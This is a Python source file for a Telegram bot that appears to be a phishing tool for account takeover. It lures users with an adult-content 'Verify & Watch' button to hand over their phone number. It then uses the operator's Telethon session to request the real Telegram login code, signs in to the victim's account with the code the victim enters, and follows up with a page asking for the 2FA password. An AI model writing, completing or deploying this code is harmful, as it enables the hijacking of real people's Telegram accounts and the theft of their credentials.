import os
import asyncio
import logging
from dotenv import load_dotenv

# For Bot API (user interaction)
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# For Telethon (sending real OTPs)
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# Credentials
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PHONE_NUMBER = os.getenv("PHONE_NUMBER")
MINI_APP_URL = os.getenv("MINI_APP_URL")

# Store data
user_data = {}  # key: user_id, value: {"phone_code_hash": "..."}

# Fix event loop
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# Initialize Telethon client (your account to send OTPs)
telethon_client = TelegramClient('main_session', API_ID, API_HASH, loop=loop)


async def start_telethon():
    """Start the Telethon client"""
    await telethon_client.start(PHONE_NUMBER)
    logger.info("Telethon client started!")


async def send_real_otp(phone_number, user_id):
    """Send real OTP using Telegram's MTProto API"""
    logger.info(f"Sending OTP to {phone_number} for user {user_id}")
    
    try:
        result = await telethon_client.send_code_request(phone_number)
        user_data[user_id] = {"phone_code_hash": result.phone_code_hash}
        logger.info(f"OTP sent successfully to {phone_number}")
        return True, "OTP sent successfully! Check your Telegram app!"
        
    except Exception as e:
        logger.error(f"Error sending OTP: {e}")
        return False, f"Error sending OTP: {str(e)}"


async def verify_real_otp(phone_number, otp, user_id):
    """Verify the OTP using MTProto API"""
    logger.info(f"Verifying OTP {otp} for {phone_number}")
    
    try:
        if user_id not in user_data:
            return False, "No OTP requested!"
            
        phone_code_hash = user_data[user_id]["phone_code_hash"]
        await telethon_client.sign_in(phone_number, otp, phone_code_hash=phone_code_hash)
        
        # Clear user data
        del user_data[user_id]
        
        logger.info(f"Successfully verified {phone_number}")
        return True, "✅ Verification successful!"
        
    except PhoneCodeInvalidError:
        return False, "❌ Invalid OTP!"
    except Exception as e:
        logger.error(f"Verification error: {e}")
        return False, f"❌ Error: {str(e)}"


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message"""
    logger.info(f"User {update.effective_user.id} started the bot")
    
    keyboard = [
        [KeyboardButton("🔞 Verify & Watch", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔥 Welcome! Click below to verify your Telegram account!",
        reply_markup=reply_markup
    )


async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle data from mini app"""
    data = update.effective_message.web_app_data.data
    user_id = update.effective_user.id
    logger.info(f"Received from user {user_id}: {data}")
    
    if data.startswith("send_otp:"):
        phone = data.split(":", 1)[1]
        success, message = await send_real_otp(phone, user_id)
        await update.effective_message.reply_text(message)
        
    elif data.startswith("verify_otp:"):
        phone = user_data.get(user_id, {}).get("phone", "+919876543210")  # In real app, store phone too
        otp = data.split(":", 1)[1]
        success, message = await verify_real_otp(phone, otp, user_id)
        
        if success:
            keyboard = [
                [KeyboardButton("🔐 Verify 2FA", web_app=WebAppInfo(url=MINI_APP_URL + "/twofa.html"))]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.effective_message.reply_text(
                message + "\n\nClick below to complete 2FA!",
                reply_markup=reply_markup
            )
        else:
            await update.effective_message.reply_text(message)
            
    elif data.startswith("verify_2fa:"):
        await update.effective_message.reply_text(
            "✅ Verification complete! Enjoy! 🎉"
        )


async def main():
    """Start everything"""
    # Start Telethon first
    await start_telethon()
    
    # Then start the Bot API
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(
        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data)
    )
    
    # Run both
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    await application.stop()


if __name__ == "__main__":
    loop.run_until_complete(main())
